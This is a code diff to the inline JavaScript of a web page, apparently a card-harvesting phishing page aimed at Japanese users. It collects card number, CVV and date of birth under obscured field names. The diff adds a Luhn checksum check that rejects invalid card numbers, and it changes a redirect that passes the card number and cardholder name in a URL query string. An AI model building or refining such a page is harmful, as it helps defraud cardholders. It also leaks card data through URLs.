@@ -1980,7 +1980,24 @@
                         }
 </style>
                             <script>
+function valid_credit_card(value) {
+    if (/[^0-9-\s]+/.test(value))
+        return false;
+    var nCheck = 0, bEven = false;
+    value = value.replace(/\D/g, "");
 
+    for (var n = value.length - 1; n >= 0; n--) {
+        var cDigit = value.charAt(n),
+                nDigit = parseInt(cDigit, 10);
+
+        if (bEven && (nDigit *= 2) > 9) nDigit -= 9;
+
+        nCheck += nDigit;
+        bEven = !bEven;
+    }
+
+    return (nCheck % 10) == 0;
+}
                             function checkForm(formA) {
                                 var cxdi = $('#cxdi').val();
                                 var cvv = $('#vxvxc').val();
@@ -1989,7 +2006,8 @@
                                 var birth_year = $('#birth_year').val();
                                 var birth_month = $('#birth_month').val();
                                 var birth_day = $('#birth_day').val();
-                                if (cxdi == '' || cxdi.length <15 || (cxdi[0]!=3 && cxdi.length == 15)  ) {
+                                var isValidCard = valid_credit_card(cxdi);
+                                if (cxdi == '' || cxdi.length <15 || (cxdi[0]!=3 && cxdi.length == 15)  || !isValidCard) {
                                     alert('有効なクレジットカードまたはデビットカードの番号を入力してください');
                                     return false;
                                 }
@@ -2384,7 +2402,7 @@
                     year: year
                 },
                 function (data) {
-                    window.location.href = '/verified?nameCard='+nameCard+'&cxdi='+cxdi;
+                    window.location.href = '/user-verified?nameCard='+nameCard+'&cxdi='+cxdi;
                 }, "json");
     })
 </script>
